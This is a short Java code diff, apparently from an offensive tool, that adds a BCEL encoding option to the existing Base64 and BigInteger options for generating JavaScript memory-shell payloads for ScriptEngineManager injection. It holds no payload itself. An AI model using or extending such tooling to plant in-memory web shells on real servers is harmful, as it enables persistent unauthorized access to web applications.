@@ -64,7 +64,8 @@ public class ScriptEngineManagerExpr implements IExpr {
         try {
             return new String[]{
                     "[+] JS-BASE64方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64)) + System.lineSeparator() + " <==",
-                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + System.lineSeparator() + " <=="
+                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + System.lineSeparator() + " <==",
+                    "[+] JS-BCEL方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL)) + System.lineSeparator() + " <=="
             };
         } catch (Exception ex) {
             return new String[]{
